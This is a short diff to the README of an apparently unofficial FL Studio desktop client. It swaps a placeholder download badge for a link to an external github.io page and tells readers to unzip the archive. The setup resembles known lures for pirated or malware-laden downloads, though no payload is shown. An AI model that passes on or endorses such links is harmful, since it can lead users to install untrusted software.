@@ -6,7 +6,7 @@ This unofficial FL Studio desktop client brings the industry-standard music prod
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://fl-studio-desktop-app.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
